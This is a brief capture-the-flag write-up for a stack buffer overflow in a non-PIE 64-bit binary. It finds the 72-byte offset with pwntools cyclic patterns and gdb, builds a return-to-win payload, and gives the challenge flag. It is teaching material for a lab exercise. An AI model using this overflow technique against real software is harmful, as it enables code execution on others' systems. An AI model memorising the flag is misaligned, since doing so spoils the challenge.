# Solution
We are given 64-bit ELF binary, not PIE (which means there are fixed addresses).
The stack frame reserves 0x40 bytes for the buffer (sub rsp, 0x40).
The code calls read with size 0x100 (256), so it writes up to 256 bytes into a 64-byte buffer (which could lead to an overflow).
And finally, the win function os present as a symbol and is at static address 0x401196 (because the binary is not PIE)

To find the overwrite offset, you can either find it from the source/disassembly (64 bytes buffer + 8 saved RBP = 72):

> from pwn import *
> p = cyclic(200)
> send p to program (locally or remote), then when crash occurs, get RIP
> (gdb) run < <(python -c 'print(p)')
> (gdb) x/40gx $rsp
> or if the program dumped core, get the RIP value and call cyclic_find(rip_value)s


Or directly with pwntools:

``
python3 - <<EOF
from pwn import *
p = cyclic(200)
print(cyclic_find(0x6161616261616461))  # use actual crashed RIP value
EOF
``

It should yield 72.
We can then send the payload as:
`payload = b"A"*72 + p64(0x401196)`

## Flag
Flag: ctf{3c1315f63d550570a690f693554647b7763c3acbc806ae846ce8d25b5f364d10}
